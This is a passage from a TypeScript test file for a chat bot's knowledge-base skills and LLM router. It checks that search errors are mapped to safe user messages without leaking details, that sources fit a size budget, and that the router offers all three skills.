      [401, /READ_SEARCH/],
      [404, /searchPath/],
      [422, /rejected the search/],
      [500, /LLM provider/],
      [undefined, /in time/],
    ];
    for (const [status, re] of cases) {
      const f = fakes();
      vi.mocked(f.onyx.search).mockRejectedValue(new OnyxError(`Onyx returned ${status}: secret-detail`, status));
      await createKbAsk().run(task({ text: "q" }), f.ctx);
      expect(f.sent[0]!.text).toMatch(re);
      expect(f.sent[0]!.text).not.toContain("secret-detail");
      expect(f.llm.chat).not.toHaveBeenCalled();
    }
    // anything that is not an Onyx error is a bug and still reaches the generic handler
    const g = fakes();
    vi.mocked(g.onyx.search).mockRejectedValue(new Error("boom"));
    await expect(createKbAsk().run(task({ text: "q" }), g.ctx)).rejects.toThrow("boom");
    expect(searchFailure(new Error("x"))).toMatch(/in time/);
  });

  it("fits sources into the budget, best first", () => {
    const many = [1, 2, 3].map((n) => ({ title: `t${n}`, content: "x".repeat(4000) }));
    expect(pickSources(many, 9000).map((s) => s.n)).toEqual([1, 2]);
    expect(pickSources(many, 10).map((s) => s.n)).toEqual([1]); // always keep the top hit
    expect(toMrkdwn("# Title\n- a\n**b**")).toBe("*Title*\n• a\n*b*");
  });
});

describe("router", () => {
  it("offers all three skills to the LLM router", async () => {
    const chat = vi.fn(async () => ({ text: JSON.stringify({ skill: "kb-ask" }), usage: { promptTokens: 1, completionTokens: 1 } }));
    const f = fakes({ hits: [{ title: "T", content: "c" }], llmReply: "ok [1]" });
    const router = new Router({
      botName: "moose", notifier: f.ctx.notifier, llm: { chat }, log, context: () => f.ctx,
      skills: [createKbCollect(), createKbFiles(), createKbAsk()],
    });
    await router.handle(task({ text: "what does the report say?", thread: undefined }));
    const system = (chat.mock.calls[0] as unknown as [{ content: string }[]])[0][0]!.content;
    expect(system).toMatch(/- kb-collect:/);
    expect(system).toMatch(/- kb-files:/);
    expect(system).toMatch(/- kb-ask:/);
    expect(f.sent[0]!.text).toBe("ok [1]");
    await router.handleAction("kb-files:undo", "a", { id: "U1" }, "C1");
    expect(f.onyx!.delete).toHaveBeenCalledWith("a");
  });
});
